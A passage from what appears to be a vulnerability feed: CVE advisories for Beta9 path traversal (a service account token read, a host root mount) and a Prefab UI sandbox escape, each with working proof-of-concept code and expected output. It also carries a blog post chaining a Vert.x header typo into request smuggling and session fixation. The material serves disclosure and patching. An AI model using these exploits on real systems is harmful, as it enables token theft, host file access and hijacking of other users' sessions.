sandbox ...") instance = Sandbox(cpu=0.5, memory=256, keep_warm_seconds=300).create() created = True print(f"[*] using sandbox: {instance.container_id}\n") try: proc = instance.process.exec( "sh", "-c", f"cat {TOKEN_PATH} 2>&1 || echo ABSENT_IN_CONTAINER" ) proc.wait() inside = (proc.stdout.read() + proc.stderr.read()).strip() resp = pod.sandbox_download_file( PodSandboxDownloadFileRequest( container_id=instance.container_id, container_path=TRAVERSAL ) ) print(f"===== INSIDE THE SANDBOX: {TOKEN_PATH} =====") if "ABSENT_IN_CONTAINER" in inside or len(inside) < 100: print(inside or "(no output)") else: print(f"(a {len(inside)}-byte file IS present inside the sandbox; value withheld)") print(f"\n===== VIA THE FILE API: {TRAVERSAL} =====") if not resp.ok or not resp.data: print(f"read failed: {resp.error_msg or 'empty response'}") print("\nNOT VULNERABLE: the file API returned nothing for the escaped path") return 0 token = resp.data.decode().strip() print( f"a {len(token)}-byte Kubernetes service account token " f"(raw value withheld), whose claims name:" ) print(json.dumps(jwt_claims(token), indent=2)) print("\n===== VERDICT =====") if "ABSENT_IN_CONTAINER" in inside: print( "VULNERABLE: the path does not exist inside the sandbox, yet the " "file API returned the hosting worker's service account token. " "The bytes were read from the worker's filesystem." ) else: print( "VULNERABLE: the file API returned a token through an escaped " "path; the claims above name the pod the token belongs to." ) return 1 finally: if created and not args.keep_container: print(f"\n[*] terminating sandbox {instance.container_id}") instance.terminate() if __name__ == "__main__": raise SystemExit(main()) ```
**Step 3 - Compare the in-sandbox view with the file API**
``` python3 poc_beta9_sandbox_token_diff.py --gateway gateway.example.com:443 --token $BETA9_TOKEN ```
Expected output on a worker before 0.1.756. The token itself is withheld. The claims name the worker pod, which is a different name from the sandbox: ``` ===== INSIDE THE SANDBOX: /var/run/secrets/kubernetes.io/serviceaccount/token ===== cat: /var/run/secrets/kubernetes.io/serviceaccount/token: No such file or directory ABSENT_IN_CONTAINER ===== VERDICT ===== VULNERABLE: the path does not exist inside the sandbox, yet the file API returned the hosting worker's service account token. The bytes were read from the worker's filesystem. ```
On worker 0.1.756 or later the same script prints `NOT VULNERABLE: the file API returned nothing for the escaped path`. ## Vulnerability Mitigations Upgrade the Beta9 worker to 0.1.756 or later. Sandbox file APIs and workspace sync use `os.OpenRoot`, so parent-directory segments and symbolic links stay inside the container root or the mount source. The change is https://github.com/beam-cloud/beta9/pull/1897, commit a28bf12cf0007c792a25d8ed282b4e8bf6f30393, released as worker 0.1.756 on 2026-09-15. ## References https://www.cve.org/CVERecord?id=CVE-2026-120307 https://github.com/beam-cloud/beta9/pull/1897 https://github.com/beam-cloud/beta9/commit/a28bf12cf0007c792a25d8ed282b4e8bf6f30393 https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.756 https://github.com/beam-cloud/beta9

item.title: Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal
item.description: CVE-2026-120308, CRITICAL, Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal
item.content:encoded:
## Summary Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal ## Component Beta9 gateway and worker (github.com/beam-cloud/beta9) ## Affected versions gateway < 0.1.776 worker < 0.1.756 ## Description A tenant who deploys a function, endpoint, or task queue on Beta9 can attach a volume. `ConfigureContainerRequestMounts` in `pkg/abstractions/common/mount.go` builds the host path by joining the shared volumes root, the workspace name, and the volume identifier from the stub. Nothing checks that the identifier names a volume that workspace owns. Parent-directory segments in the identifier collapse the joined path to the worker's filesystem root. The worker bind-mounts that path into the sandbox. The mount is read-write unless the volume was explicitly marked read-only, which is not the default. A workspace token is enough. On gateway 0.1.769 and worker 0.1.745, a volume identifier made of parent-directory segments made the container mount show the worker root: the worker hostname and resolver configuration were readable from inside the sandbox, and the directory listing contained host directories rather than an empty tenant volume. Other tenants' volumes stored on that host are on the same filesystem. The proof read those files. It was not run against a live multi-tenant cluster. Gateway 0.1.776 and worker 0.1.756 reject an identifier that is empty, `.`, `..`, or contains a slash, and a mount path that contains a `..` segment. The gateway also refuses a volume the workspace does not own. Stubs saved before the check existed are validated when they are launched, so both components need the upgrade. ## PoC
**Step 1 - Install the client and select the deployment**
``` pip install beta9 beta9 configure --token ```
**Step 2 - Save the volume deploy**
The subclass marks the volume ready so the client sends the identifier as given, instead of looking up a real volume first. The function then reads two files through the resulting mount and lists the mount root. ``` import os from beta9 import Image, function from beta9.abstractions.volume import Volume class TraversalVolume(Volume): def __init__(self, volume_id: str, mount_path: str): super().__init__(name="poc", mount_path=mount_path) self.volume_id = volume_id self.ready = True HOST_ROOT = TraversalVolume(volume_id="../../..", mount_path="/pwn") @function(volumes=[HOST_ROOT], image=Image(), cpu=0.5, memory=256) def read_worker_host(): proof = {} for f in ("/pwn/etc/hostname", "/pwn/etc/resolv.conf"): try: with open(f) as fh: proof[f] = fh.read()[:200] except Exception as e: proof[f] = f"" proof["/pwn (host /)"] = sorted(os.listdir("/pwn")) return proof if __name__ == "__main__": result = read_worker_host.remote() print("\n===== PoC result (executed inside the sandboxed container) =====") for k, v in result.items(): print(f"\n--- {k} ---\n{v}") ```
**Step 3 - Deploy and run it**
``` python3 poc_volume_traversal.py ```
Expected output on gateway 0.1.769 with worker 0.1.745. `/pwn` is the worker root, so the listing contains host directories such as `/data`, `/root`, and `/run`, and the hostname file is the worker's: ``` ===== PoC result (executed inside the sandboxed container) ===== --- /pwn/etc/hostname --- --- /pwn/etc/resolv.conf --- --- /pwn (host /) --- ['bin', 'data', 'etc', 'lib', 'root', 'run', ...] ```
On gateway 0.1.776 or later, together with worker 0.1.756 or later, stub creation rejects the identifier and the function does not start. ## Vulnerability Mitigations Upgrade the gateway to 0.1.776 or later and the worker to 0.1.756 or later. Volume identifiers and mount paths are validated before a mount is built, and the gateway rejects a volume that does not exist or is not owned by the workspace. Upgrade both. A stub saved by an old gateway is checked again when a new worker launches it, and an old worker still mounts the path an old gateway sends. The change is https://github.com/beam-cloud/beta9/pull/1897, commit a28bf12cf0007c792a25d8ed282b4e8bf6f30393, released on 2026-09-15. ## References https://www.cve.org/CVERecord?id=CVE-2026-120308 https://github.com/beam-cloud/beta9/pull/1897 https://github.com/beam-cloud/beta9/commit/a28bf12cf0007c792a25d8ed282b4e8bf6f30393 https://github.com/beam-cloud/beta9/releases/tag/gateway-0.1.776 https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.756 https://github.com/beam-cloud/beta9/releases/tag/gateway-0.1.769 https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.745 https://github.com/beam-cloud/beta9

item.title: Prefab UI is vulnerable to Remote Code Execution via a Pyodide js Bridge to Deno
item.description: CVE-2026-120338, CRITICAL, Prefab UI is vulnerable to Remote Code Execution via a Pyodide js Bridge to Deno
item.content:encoded:
## Summary Prefab UI is vulnerable to Remote Code Execution via a Pyodide js Bridge to Deno ## Component prefab-ui (github.com/PrefectHQ/prefab) ## Affected versions >= 0.14.0, < 0.21.0 ## Description Prefab UI's Generative UI sandbox runs caller-supplied Python inside Pyodide, which is Python compiled to WebAssembly, in a Deno subprocess. The feature is documented as isolation for untrusted code, including UI written by a model. `PyodideSandbox._start` in `src/prefab_ui/sandbox/_pyodide.py` starts that process with unrestricted `--allow-read`, `--allow-write`, and `--allow-net`. The runner in `src/prefab_ui/sandbox/runner.js` leaves the Deno API on the JavaScript global object. Pyodide's `js` module proxies that global, so the Python can call `Deno.readTextFileSync` and `Deno.writeTextFileSync` on the host. The runner comment and the public docs describe this process as read-only. The usual remote path is FastMCP's `GenerativeUI` provider. It registers the MCP tool `generate_prefab_ui` and forwards the tool's `code` argument into this sandbox. There is no extra check on that tool. On a FastMCP server with no authentication configured, any client who can reach the server can call it. With authentication, any client allowed to call tools can. The 10.0 score is the unauthenticated case. The same bug with an authenticated tool caller scores 9.9 (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`). Generative UI is opt-in, and the host must have Deno installed. Servers that never execute untrusted code in this sandbox are not exposed. A caller who can submit the code can read and write files as the server OS user. On prefab-ui 0.20.2 the same write was used to plant a `.pth` file in the server virtualenv's `site-packages`, and the next Python process that used that environment ran the planted import. The sandbox shipped in 0.14.0 with those Deno permissions, and they were still present in 0.20.2. prefab-ui 0.21.0 revokes read, write, and network permission after startup, before it accepts code. ## PoC
**Step 1 - Install the vulnerable release**
Deno must be on `PATH`. The sandbox does not start without it. ``` pip install 'prefab-ui==0.20.2' 'fastmcp[apps]' ```
**Step 2 - Start a FastMCP server with Generative UI and no authentication**
``` from fastmcp import FastMCP from fastmcp.apps.generative import GenerativeUI mcp = FastMCP("poc") mcp.add_provider(GenerativeUI()) mcp.run(transport="http", host="127.0.0.1", port=8127) ```
**Step 3 - Call generate_prefab_ui**
The read returns the host file inside the rendered text. The write creates `/tmp/prefab-ui-sandbox-proof.txt`. ``` import asyncio from fastmcp import Client READ = """ import js from prefab_ui.components import Text secret = js.Deno.readTextFileSync("/etc/passwd") leak = Text("EXFIL_BEGIN" + secret + "EXFIL_END") """ WRITE = """ import js from prefab_ui.components import Text js.Deno.writeTextFileSync("/tmp/prefab-ui-sandbox-proof.txt", "owned\\n") done = Text("write-ok") """ async def main(): async with Client("http://127.0.0.1:8127/mcp/") as client: print(await client.call_tool("generate_prefab_ui", {"code": READ})) await client.call_tool("generate_prefab_ui", {"code": WRITE}) asyncio.run(main()) ```
**Step 4 - Confirm the host file**
``` cat /tmp/prefab-ui-sandbox-proof.txt ```
Expected output on prefab-ui 0.20.2. The tool result contains the host passwd file between the markers, and the new file is on the host: ``` EXFIL_BEGIN # User Database ... root:*:0:0:System Administrator:... EXFIL_END owned ```
On prefab-ui 0.21.0 or later, the same read and write fail with a Deno permission error and do not return or create the host file. ## Vulnerability Mitigations Upgrade prefab-ui to 0.21.0 or later. After the runtime and Prefab sources load, the runner revokes Deno filesystem read, filesystem write, and network permission before it accepts generated code. The process is started with `--no-prompt`, so a later permission request cannot grant them again, and bootstrap network access is limited to `cdn.jsdelivr.net:443`. FastMCP servers that register `GenerativeUI` pick up the fix by running that prefab-ui release. The change is https://github.com/PrefectHQ/prefab/pull/538, commit 030f074f85e0b1be0dd44b0283185aecb26337a2, released on 2026-10-26 as v0.21.0. Until the upgrade, do not register `GenerativeUI` on a server that untrusted clients can reach. ## References https://www.cve.org/CVERecord?id=CVE-2026-120338 https://github.com/PrefectHQ/prefab/security/advisories/GHSA-595q-jv4r-q7j9 https://github.com/PrefectHQ/prefab/pull/538 https://github.com/PrefectHQ/prefab/commit/030f074f85e0b1be0dd44b0283185aecb26337a2 https://github.com/PrefectHQ/prefab/releases/tag/v0.21.0 https://pypi.org/project/prefab-ui/0.21.0/ https://github.com/PrefectHQ/prefab/releases/tag/v0.20.2 https://github.com/PrefectHQ/prefab/releases/tag/v0.14.0 https://github.com/PrefectHQ/prefab https://pypi.org/project/prefab-ui/

item.title: Byte Debt (CVE-2026-102479): From an HTTP Header Typo to Cross-User Session Fixation
item.description: A one-letter typo, Content-Xength, is accepted as Content-Length by the Eclipse Vert.x HTTP/1.x decoder (CVE-2026-102479). We chain it into response-queue desync and cross-user session fixation behind real reverse proxies.
item.content:encoded:
![](/img/RealTimePostImage/post/byte-debt-vertx-header-typo-session-fixation/image1.png)
Recently, a huge wave of web related vulnerabilities flooded the internet with php2shell as the most famous web vulnerability in years. As such our team decided to investigate an intriguing HTTP parsing anomaly tracked as CVE-2026-102479. It centers on a header parsing discrepancy within the Eclipse Vert.x HTTP/1.x decoder, where non standard headers such as `Content-Xength` are erroneously accepted as valid `Content-Length` header.
Categorized as a high-severity vulnerability from the start, our research demonstrates how this primitive can be chained to achieve arbitrary response-queue desynchronization against shared reverse proxy connections. In this blog we are going to break down the root cause, exploit mechanics, and necessary prerequisites for real-world impact.
## The Bug
The bug is in the HTTP/1 `VertxHttpRequestDecoder`, to avoid string allocations the decoder optimizes header lookups by checking name length and sampling specific byte offsets instead of verifying every character. For 14 byte headers, it validates the prefix and suffix, completely skipping offset 8 (the letter ‘L’).
Because that byte is never checked, Vert.x treats `Content-Xength` as a genuine `Content-Length header`. A front-end reverse proxy ignores the typo as an arbitrary custom header, Vert.x parses it as request framing, and the HTTP request boundary instantly desyncs.
It was fixed in version 5.1.10 by [this commit](https://github.com/eclipse-vertx/vert.x/commit/317c778d7fdd92a2fb0757dabc68a31f8c98edb0).
## Request smuggling, briefly
This bug leads to a request smuggling primitive, a technique James Kettle popularized at PortSwigger with [*HTTP Desync Attacks: Request Smuggling Reborn*](https://portswigger.net/research/http-desync-attacks). In short, a front-end reverse proxy and a backend server each decide independently where one HTTP request ends and the next begins. If they disagree, a front end can forward what it thinks is a clean request, while the backend reads a different number of bytes as that request body, leaving a fragment behind that gets misread as the start of whoever request comes next on that same reused connection.
In classic HTTP request smuggling (CL.TE or TE.CL), the desync comes down to how each header signals where the body ends:
* `Content-Length` specifies a fixed byte count declared upfront, the server simply counts down those bytes and stops. * `Transfer-Encoding: chunked` has no fixed total size. The body arrives in pieces, each declaring its own hex size, and only stops when the server hits an inline terminating chunk (`0\r\n\r\n`).
Because that `0` chunk acts as an immediate stop sign, a chunk-aware parser halts right there, completely ignoring whatever number was in `Content-Length`. If one server measures by fixed byte count while the other stops at the `0` marker, their boundaries split, leaving the leftover bytes trapped in the pipeline to poison the next request.
Our bug does not need conflicting headers at all, just a single misspelled one.
## Setup
The backend is a Quarkus app, sitting behind nginx (and haproxy, for cross-proxy confirmation) in Docker, with real backend connection pooling turned on, the realistic production setup rather than a one-off lab shortcut.
## First win: making a connection hang, then starving someone else's request
Our first instinct was the classic move, send a real `Content-Length` *and* a fake `Content-Xength` on the same request, hoping Vert.x would read the wrong header and leave an exact chunk of leftover data queued up to poison the next request. That was blocked outright, thanks to Netty's own duplicate `Content-Length` rejection (a defense from [CVE-2019-20445](https://nvd.nist.gov/vuln/detail/cve-2019-20445)) that kills the request with an instant `400` before it ever reaches the app.
Here is what actually works, send a Content-Xength: 50 header without a body, the front end sees no declared body and happily assumes the request is finished transferring the request to Vert.x. Meanwhile Vert.x ignores the typo, decides it is owed 50 bytes, and just sits there waiting. The result is an instant connection hang, tying up backend server threads while you walk away without ever sending another byte that can lead to potential DoS.
Aim that trick at an endpoint that ignores bodies and Vert.x will reply instantly, but it will not forget what it is owed. The connection keeps listening for those declared bytes while the front end marks the exchange complete and returns the connection to its idle pool. The next innocent request arrives, and Vert.x silently swallows it as part of your phantom body, never routed, never logged, completely erased, turning a simple hang into a surgical, silent denial of service against the next stranger in line. ![](/img/RealTimePostImage/post/byte-debt-vertx-header-typo-session-fixation/image2.png)
## Pushing further: the double-desync
Turning this exact mismatch into full response poisoning can potentially be done by the technique laid out in [HTTP/1.1 Must Die: The Desync Endgame](https://portswigger.net/research/http1-must-die). The concept is simple, instead of leaving that byte debt open, you pay it off with data you completely control.
In short, it looks like this: request A opens the byte debt. Request B arrives with its body hiding two spliced requests, C and D.
A's debt consumes B's headers completely. The backend skips B entirely, parses C, and hands you the response. It then parses D, but because the front end only expects one reply, D sits orphaned in the socket, waiting to be served to the next visitor.
To make the debt swallow B's headers perfectly, the byte count must match what the proxy actually outputs on the wire, because proxies like Nginx often inject their own headers along the way. In our lab we used [calibrate blind technique](https://portswigger.net/blog/http-1-1-must-die-conquering-the-0-cl-challenge#solution-b-calculating-the-offset-of-the-injected-headers), in which you scan a window of candidate byte counts and use whether the throwaway request C comes back as a clean page or a garbled error as the oracle.
![](/img/RealTimePostImage/post/byte-debt-vertx-header-typo-session-fixation/image3.png) We tested seven separate proxies: Nginx, HAProxy, Envoy, Traefik, Caddy, Apache httpd, and nghttpx. Every single one caught it the exact same way, but unfortunately, before recycling a backend connection into the pool, the front end peeks at the socket, spots D's unread response, and discards the dirty connection instead of handing it to a victim. That single check stopped us cold.
## The breakthrough: the dangling byte
We needed a way to prevent D from generating an immediate response, the solution was leaving a single dangling byte on D.
The backend parses D headers, realizes it is still owed one byte of body, and simply pauses so no response is generated. When the front end checks the socket, it finds an empty buffer, assumes the connection is clean, and returns it to the pool.
The next real visitor arrives, and the very first byte of their request satisfies D debt. The backend instantly fires D response back to them instead of answering their own traffic.
More on that [technique](https://portswigger.net/research/can-ai-do-novel-security-research#the-dangling-byte-technique).
![](/img/RealTimePostImage/post/byte-debt-vertx-header-typo-session-fixation/image4.png)
We rebuilt the exploit from scratch against our own stack and reproduced it live, end to end, as session fixation.
We turned request D into a genuine `POST /login` using attacker credentials. When an unsuspecting visitor arrived with no cookies, the server handed them D response, a 303 redirect setting a session cookie for Alice. A follow-up request confirmed the planted session was live, dropping the victim straight into Alice's account, balance, and private data.
It worked deterministically across every proxy we tested, including Caddy and nghttpx, which had been the most aggressive at closing dirty connections under the previous setup.
**Live run, nginx:**
![](/img/RealTimePostImage/post/byte-debt-vertx-header-typo-session-fixation/image5.png)
That 100% hit rate relied on a single connection. Against a realistic 16-connection pool, spraying poisons roughly 25–35% of subsequent traffic: not guaranteed on the very next request, but still severe.
## What you can actually do with it
* **Session fixation:** The victim's browser silently receives a cookie for your account. If they make a purchase or upload private documents, they do it inside your account, leaving the data for you to view later.
* **Upgraded XSS:** Reflected XSS usually requires tricking someone into clicking a suspicious link. Smuggling fires the payload directly into an innocent user browser as they browse normally.
* **Stealth phishing:** If any endpoint redirects based on user input, you can bounce a victim directly to a phishing site with what looks like a trusted, same-site redirect.
None of this requires exotic flaws, just everyday features like a login form, an echoed field, or a redirect parameter.
## Scope, not scare
`vertx-core` has around 2,100 Maven dependents and north of 300 million cumulative downloads, but those figures span the entire history of the project. The actual exposure window is narrow: three minor release branches shipped over a few months (`5.0.0`–`5.0.12`, `5.1.0`–`5.1.9`, and `5.2.0`), patched in `5.1.10` and `5.2.1`. The takeaway isn't that Vert.x as a whole is broken, it is that if you deployed the modern 5.x line during that window, you are potentially vulnerable.
## Popular Affected OpenSource Projects
Our team was able to POC this vulnerability on several popular open source projects that use Vert.x webserver in the vulnerable version, in certain setups behind a frontend proxies such as:
| Project | GitHub Link | GitHub Stars | Maven | | :---- | :---- | :---- | :---- | | **TechEmpower/FrameworkBenchmarks** | [TechEmpower/FrameworkBenchmarks](https://github.com/TechEmpower/FrameworkBenchmarks) | 8,105 | Not published benchmark suite, built from source. | | **strimzi/strimzi-kafka-bridge (0.33.0)** | [strimzi/strimzi-kafka-bridge](https://github.com/strimzi/strimzi-kafka-bridge) | 345 | io.strimzi:kafka-bridge published, but mainly distributed as the GA container image PoC'd. | | **apache/camel-quarkus** | [apache/camel-quarkus](https://github.com/apache/camel-quarkus) | 302 | 509 dependent artifacts on camel-quarkus-core |
Note: All projects were reported directly regarding their potential vulnerability when using the affected Vert.x webserver version behind frontend proxies.
## Fix
Upgrade `io.vertx:vertx-core` to **5.1.10**, **5.2.1**, or newer. This patches the canonicalization flaw at the root, eliminating both the connection-starvation DoS and the response-poisoning chain

item.title: Beyond testmetest: Native Addon Camouflage and 42 Armed GitHub Repositories Reveal a Hidden npm Publisher
item.description: JFrog Security Research linked 42 armed GitHub repositories in the testmetest campaign to a hidden npm publisher, an active encrypted data sink and previously reported GitHub Actions cPanel exploitation infrastructure.
